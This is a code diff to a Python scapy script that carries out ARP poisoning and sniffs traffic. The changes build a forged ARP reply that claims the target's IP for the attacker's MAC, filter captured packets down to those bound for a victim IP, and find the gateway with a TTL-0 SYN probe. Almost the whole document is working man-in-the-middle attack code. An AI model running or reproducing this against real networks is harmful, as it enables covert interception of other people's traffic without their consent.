@@ -6,8 +6,7 @@ import threading
 import keyboard
 import time
 from getmac import get_mac_address as gma
-import subprocess
-import re
+from socket import *
 
 # Constants
 DEFAULT_GATEWAY_IP = "10.0.0.138"
@@ -46,6 +45,10 @@ def arp_poison(target_ip="0.0.0.0", gateway_ip="0.0.0.0",
     # Setting the start time of the operation
     start_time = time.perf_counter()
 
+    # We form an ARP type 2 (reply) telling the gateway router our MAC address is the target's MAC address
+    localhost_MAC = gma()
+    p = Ether(dst=gateway_mac) / ARP(hwlen=6, plen=4, op=2, psrc=target_ip, hwsrc=localhost_MAC, hwdst=gateway_mac,
+                                     pdst=gateway_ip)
     while True:
         # With each loop iteration, We check the current global time
         current_time = time.perf_counter()
@@ -55,10 +58,6 @@ def arp_poison(target_ip="0.0.0.0", gateway_ip="0.0.0.0",
         if elapsed_time >= operation_duartion:
             break
 
-        # We form an ARP type 2 (reply) telling the gateway router our MAC address is the target's MAC address
-        localhost_MAC = gma()
-        p = Ether(dst=gateway_mac) / ARP(hwlen=6, plen=4, op=2, psrc=target_ip, hwsrc=localhost_MAC, hwdst=gateway_mac,
-                                         pdst=gateway_ip)
         # Sending the packet
         sendp(p, verbose=0, iface=INTERFACE)
 
@@ -71,16 +70,27 @@ def arp_poison(target_ip="0.0.0.0", gateway_ip="0.0.0.0",
 
 
 def sniff_data(operation_duration=5, target_ip=''):
+    # Getting localhost IP for packet filtering
+    localhost_ip = get_if_addr(INTERFACE)
+
+    # Defining packet filter to get only intercepted packets that were destined to the target
+    def packet_filter(packet):
+        return (IP in packet) and (packet[IP].dst == target_ip) and (packet[IP].src != localhost_ip)
+
     while True:
 
         # Setting the localhosts NIC to sniff packets that are not destined to localhost
         conf.promisc = True
 
         # Start Sniffing for the operation duration the user wanted
-        capture = sniff(timeout=operation_duration)
+        capture = sniff(timeout=operation_duration, lfilter=packet_filter)
 
         # Printing Packets Sniffed and stopping the thread
+        print("*" * 50)
+        print("Intercepted Packets: ")
+        print("*" * 50)
         print(capture.summary())
+        print("*" * 50)
 
         # If the user wants to break the operation, he can press q
         if keyboard.is_pressed("q"):
@@ -90,18 +100,13 @@ def sniff_data(operation_duration=5, target_ip=''):
 
 def get_defaultgateway_details():
     gateway_ip = None
-    # Getting the default gateway IP from the system's networking settings using regex matching
-    try:
-        ipconfig_output = subprocess.check_output("ipconfig", shell=True).decode()
-        gateway_ip_pattern = re.compile(
-            r"(Default Gateway|Gateway)\s*(?:\:|.)\s*((?:\d{1,3}\.){3}\d{1,3}|(?:[a-fA-F0-9]{1,4}:){7}[a-fA-F0-9]{1,4})",
-            re.MULTILINE)
-        matches = gateway_ip_pattern.findall(ipconfig_output)
-        for match in matches:
-            if '.' in match[1]:
-                gateway_ip = match[1]
-    except Exception as e:
-        raise Exception(f"Error obtaining default gateway IP: {e}")
+
+    # Sending a TCP SYN packet with time-to-live (ttl) of 0, meaning the packet will be dropped at the default gateway router
+    # The router will then send an ICMP message back, telling the localhost that the packet was dropped, and we get his IP from that reply
+    p = IP(dst=gethostbyname("google.com"), ttl=0) / TCP(dport=80, flags='S')
+    answers = sr1(p, verbose=0)
+    for ans in answers:
+        gateway_ip = ans["IP"].src
 
     # Returning the found details
     return [gateway_ip, gma(ip=gateway_ip)]
